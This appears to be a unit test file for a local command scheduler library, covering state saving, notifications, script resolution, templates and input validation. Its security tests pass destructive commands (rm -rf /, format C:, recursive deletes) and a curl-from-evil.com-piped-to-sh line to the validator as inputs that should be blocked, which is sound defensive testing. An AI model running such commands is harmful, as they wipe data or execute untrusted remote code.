
const { describe, it, before, after } = require('node:test');
const assert = require('node:assert');
const fs = require('fs');
const path = require('path');
const os = require('os');

const TEST_DIR = path.join(os.tmpdir(), 'local-scheduler-test-' + Date.now().toString(36));
process.env.SCHEDULER_TEST_DIR = TEST_DIR;

// Force reload lib for this test suite
const libPath = require.resolve('../lib.js');
delete require.cache[libPath];
const lib = require(libPath);

function cleanTestDir() {
  if (fs.existsSync(TEST_DIR)) {
    fs.rmSync(TEST_DIR, { recursive: true, force: true });
  }
}

describe('lib.js unit tests', () => {
  before(() => {
    cleanTestDir();
    lib.ensureDirs();
    lib.resetState();
    lib.loadState();
  });

  after(() => {
    cleanTestDir();
  });

  describe('paths', () => {
    it('uses test dir override', () => {
      assert.strictEqual(lib.DATA_DIR, TEST_DIR);
      assert.ok(fs.existsSync(lib.DATA_DIR));
      assert.ok(fs.existsSync(lib.SCRIPTS_DIR));
    });
  });

  describe('save and load', () => {
    it('saves and loads automations', () => {
      lib.addAutomation({ id: 'a1', name: 'test', intervalMinutes: 5, nextRun: Date.now(), logs: [] });
      lib.save();
      lib.resetState();
      lib.loadState();
      assert.strictEqual(lib.listAutomations().length, 1);
      assert.strictEqual(lib.listAutomations()[0].id, 'a1');
    });

    it('saves and loads tasks', () => {
      lib.resetState();
      lib.addTask({ id: 't1', name: 'task', status: 'running' });
      lib.saveTasks();
      lib.resetState();
      lib.loadState();
      assert.strictEqual(lib.listTasks().length, 1);
      assert.strictEqual(lib.listTasks()[0].status, 'running');
    });

    it('saves and loads config', () => {
      lib.resetState();
      lib.config.webhookUrl = 'http://example.com/hook';
      lib.saveConfig();
      lib.resetState();
      lib.loadState();
      assert.strictEqual(lib.config.webhookUrl, 'http://example.com/hook');
    });

    it('saves and loads ack', () => {
      lib.resetState();
      lib.lastAck = 12345;
      lib.saveAck();
      lib.resetState();
      lib.loadState();
      assert.strictEqual(lib.lastAck, 12345);
    });
  });

  describe('notifications', () => {
    it('appends and reads notifications', () => {
      lib.resetState();
      lib.ensureDirs();
      lib.appendNotification({ type: 'test', timestamp: 1000 });
      lib.appendNotification({ type: 'test', timestamp: 2000 });
      const all = lib.readNotifications(null, 50);
      assert.strictEqual(all.length, 2);
      assert.strictEqual(all[0].timestamp, 1000);
    });

    it('filters notifications by since', () => {
      const filtered = lib.readNotifications(1500, 50);
      assert.strictEqual(filtered.length, 1);
      assert.strictEqual(filtered[0].timestamp, 2000);
    });

    it('limits notification count', () => {
      lib.resetState();
      for (let i = 0; i < 10; i++) {
        lib.appendNotification({ type: 'test', timestamp: i });
      }
      const limited = lib.readNotifications(null, 5);
      assert.strictEqual(limited.length, 5);
      assert.strictEqual(limited[0].timestamp, 5);
    });

    it('counts pending correctly', () => {
      lib.resetState();
      lib.lastAck = 0;
      for (let i = 1; i <= 3; i++) {
        lib.appendNotification({ type: 'test', timestamp: i * 1000 });
      }
      assert.strictEqual(lib.getPendingCount(), 3);
      lib.lastAck = 2500;
      assert.strictEqual(lib.getPendingCount(), 1);
    });
  });

  describe('resolveCommand', () => {
    it('returns command as-is for shell commands', () => {
      const result = lib.resolveCommand({ command: 'echo hello', cwd: 'C:\\tmp' });
      assert.strictEqual(result.command, 'echo hello');
      assert.strictEqual(result.cwd, 'C:\\tmp');
    });

    it('writes js script and returns node command', () => {
      lib.ensureDirs();
      const a = { id: 'test-js', script: 'console.log(1)', scriptType: 'javascript', cwd: 'C:\\tmp' };
      const result = lib.resolveCommand(a);
      assert.ok(result.command.includes('node'));
      assert.ok(result.command.includes('test-js.js'));
      assert.ok(fs.existsSync(path.join(lib.SCRIPTS_DIR, 'test-js.js')));
      assert.strictEqual(fs.readFileSync(path.join(lib.SCRIPTS_DIR, 'test-js.js'), 'utf8'), 'console.log(1)');
    });

    it('writes python script and returns python command', () => {
      const a = { id: 'test-py', script: 'print(1)', scriptType: 'python' };
      const result = lib.resolveCommand(a);
      assert.ok(result.command.includes('python'));
      assert.ok(result.command.includes('test-py.py'));
      assert.ok(fs.existsSync(path.join(lib.SCRIPTS_DIR, 'test-py.py')));
    });

    it('writes powershell script and returns powershell command', () => {
      const a = { id: 'test-ps', script: 'Write-Host 1', scriptType: 'powershell' };
      const result = lib.resolveCommand(a);
      assert.ok(result.command.includes('powershell'));
      assert.ok(result.command.includes('test-ps.ps1'));
      assert.ok(fs.existsSync(path.join(lib.SCRIPTS_DIR, 'test-ps.ps1')));
    });

    it('defaults cwd to process.cwd() for shell commands', () => {
      const result = lib.resolveCommand({ command: 'echo hi' });
      assert.strictEqual(result.cwd, undefined);
    });

describe('security validation', () => {
  it('blocks rm -rf /', () => {
    const result = lib.validateCommand('rm -rf /');
    assert.strictEqual(result.ok, false);
    assert.ok(result.reason.includes('dangerous pattern'));
  });

  it('blocks del /f /s /q', () => {
    const result = lib.validateCommand('del /f /s /q C:\\\\');
    assert.strictEqual(result.ok, false);
  });

  it('blocks curl | sh', () => {
    const result = lib.validateCommand('curl http://evil.com | sh');
    assert.strictEqual(result.ok, false);
  });

  it('blocks format command', () => {
    const result = lib.validateCommand('format C: /y');
    assert.strictEqual(result.ok, false);
  });

  it('allows safe commands', () => {
    const result = lib.validateCommand('echo hello');
    assert.strictEqual(result.ok, true);
  });

  it('blocks dangerous javascript script', () => {
    const result = lib.validateScript(`fs.rmSync("/", {recursive:true})`, 'javascript');
    assert.strictEqual(result.ok, false);
  });

  it('blocks dangerous python script', () => {
    const result = lib.validateScript(`import os; os.system("rm -rf /")`, 'python');
    assert.strictEqual(result.ok, false);
  });

  it('blocks dangerous powershell script', () => {
    const result = lib.validateScript(`Remove-Item -Recurse -Force C:\\`, 'powershell');
    assert.strictEqual(result.ok, false);
  });

  it('allows safe scripts', () => {
    const result = lib.validateScript('console.log(1)', 'javascript');
    assert.strictEqual(result.ok, true);
  });

  it('blocks system cwd on Windows', () => {
    const result = lib.validateCwd('C:\\\\Windows\\\\System32');
    assert.strictEqual(result.ok, false);
  });

  it('blocks root C drive', () => {
    const result = lib.validateCwd('C:\\\\');
    assert.strictEqual(result.ok, false);
  });

  it('allows user home', () => {
    const result = lib.validateCwd(os.homedir());
    assert.strictEqual(result.ok, true);
  });

  it('allows repo directory', () => {
    const result = lib.validateCwd('D:\\\\repos\\\\games123');
    assert.strictEqual(result.ok, true);
  });

  it('blocks other users home', () => {
    const result = lib.validateCwd('C:\\\\Users\\\\OtroUsuario');
    assert.strictEqual(result.ok, false);
  });
});
});

  describe('templates', () => {
    it('loads built-in templates', () => {
      lib.loadTemplates();
      const list = lib.listTemplates();
      assert.ok(list.length >= 3, 'Expected at least 3 built-in templates');
      const ids = list.map(t => t.id);
      assert.ok(ids.includes('build-project'));
      assert.ok(ids.includes('disk-check'));
      assert.ok(ids.includes('git-sync'));
    });

    it('gets a template by id', () => {
      lib.loadTemplates();
      const t = lib.getTemplate('build-project');
      assert.ok(t);
      assert.strictEqual(t.id, 'build-project');
      assert.strictEqual(t.name, 'Build project');
    });

    it('interpolates params in command', () => {
      const t = { id: 'x', command: 'echo ${msg}', script: 'console.log("${msg}")', scriptType: 'javascript' };
      const r = lib.interpolateTemplate(t, { msg: 'hello' });
      assert.strictEqual(r.command, 'echo hello');
      assert.strictEqual(r.script, 'console.log("hello")');
    });

    it('interpolates params without replacing missing keys', () => {
      const t = { id: 'x', command: 'echo ${msg} ${other}' };
      const r = lib.interpolateTemplate(t, { msg: 'hi' });
      assert.strictEqual(r.command, 'echo hi ${other}');
    });

    it('loads custom templates from templates.json', () => {
      lib.ensureDirs();
      const custom = [{ id: 'custom-a', name: 'Custom A', description: 'test', defaultInterval: 10, command: 'echo a' }];
      fs.writeFileSync(path.join(lib.DATA_DIR, 'templates.json'), JSON.stringify(custom), 'utf8');
      lib.loadTemplates();
      const list = lib.listTemplates();
      assert.ok(list.some(t => t.id === 'custom-a'));
      assert.ok(list.some(t => t.id === 'build-project'));
      fs.unlinkSync(path.join(lib.DATA_DIR, 'templates.json'));
    });
  });

  describe('resetState', () => {
    it('clears all state', () => {
      lib.addAutomation({ id: 'x' });
      lib.addTask({ id: 'y' });
      lib.config.foo = 'bar';
      lib.lastAck = 999;
      lib.resetState();
      assert.strictEqual(lib.listAutomations().length, 0);
      assert.strictEqual(lib.listTasks().length, 0);
      assert.deepStrictEqual(lib.config, {});
      assert.strictEqual(lib.lastAck, 0);
    });
  });
});

